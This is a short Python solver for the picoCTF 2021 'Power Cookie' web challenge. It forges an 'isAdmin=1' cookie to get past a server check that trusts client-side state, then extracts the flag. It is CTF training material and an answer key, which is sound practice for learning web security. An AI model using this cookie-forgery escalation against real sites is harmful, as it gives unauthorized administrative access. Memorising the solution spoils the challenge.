#!/usr/bin/env python3
"""Solver for Challenge 288 Power Cookie (picoCTF 2021, Web Exploitation).

The gradebook sets a client-side cookie via guest.js:
    document.cookie = "isAdmin=0"
check.php trusts the cookie value server-side. Replaying the request
with isAdmin=1 returns the flag directly.

Usage: solve_288_power_cookie.py <base-url>
"""
import re
import sys
import urllib.request

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/133.0.0.0 Safari/537.36")

FLAG_RE = re.compile(rb"academy\{[^}]*\}|picoCTF\{[^}]*\}")


def fetch(url: str, cookie: str | None = None) -> bytes:
    headers = {"User-Agent": UA}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=30) as r:
        return r.read()


def solve(base: str) -> str:
    base = base.rstrip("/")
    # mimic guest flow, then escalate cookie
    fetch(base + "/", cookie="isAdmin=0")
    body = fetch(base + "/check.php", cookie="isAdmin=1")
    m = FLAG_RE.search(body)
    if not m:
        raise ValueError("flag not found in check.php response")
    return m.group(0).decode()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit("usage: solve_288_power_cookie.py <base-url>")
    print(solve(sys.argv[1]))
